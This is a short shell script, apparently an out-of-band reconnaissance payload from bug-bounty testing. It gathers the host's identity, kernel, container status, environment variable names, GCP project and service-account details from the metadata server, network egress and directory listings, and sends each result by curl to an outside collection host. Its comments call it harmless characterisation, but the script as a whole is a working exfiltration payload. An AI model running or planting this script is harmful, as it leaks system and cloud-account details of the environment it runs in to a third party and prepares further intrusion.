#!/bin/sh
# Characterisation only. No secret values are sent: token endpoints report STATUS CODE only,
# environment variables report NAMES only.
O="https://cfg-char.oob2.bountyexplained.com"
g() { curl -s -m 8 -G "$O/$1" --data-urlencode "v=$2" -o /dev/null 2>/dev/null; }
M="http://metadata.google.internal/computeMetadata/v1"
H="Metadata-Flavor: Google"
g host "$(hostname 2>&1)"
g id "$(id 2>&1)"
g uname "$(uname -sr 2>&1)"
g pwd "$(pwd 2>&1)"
g container "$( [ -f /.dockerenv ] && echo dockerenv; cat /proc/1/cgroup 2>/dev/null | head -1 )"
g envnames "$(env 2>/dev/null | sed 's/=.*//' | sort | tr '\n' ',' | cut -c1-350)"
g gcpproj "$(curl -s -m 6 -H "$H" $M/project/project-id 2>&1)"
g gcpsa "$(curl -s -m 6 -H "$H" $M/instance/service-accounts/default/email 2>&1)"
g gcptok_status "$(curl -s -m 6 -o /dev/null -w '%{http_code}' -H "$H" $M/instance/service-accounts/default/token 2>&1)"
g egress "google=$(curl -s -m 6 -o /dev/null -w '%{http_code}' https://www.google.com/generate_204 2>&1) gh=$(curl -s -m 6 -o /dev/null -w '%{http_code}' https://api.github.com 2>&1)"
g rootls "$(ls / 2>&1 | tr '\n' ',' | cut -c1-200)"
g workspace "$(ls -a .. 2>&1 | tr '\n' ',' | cut -c1-250)"
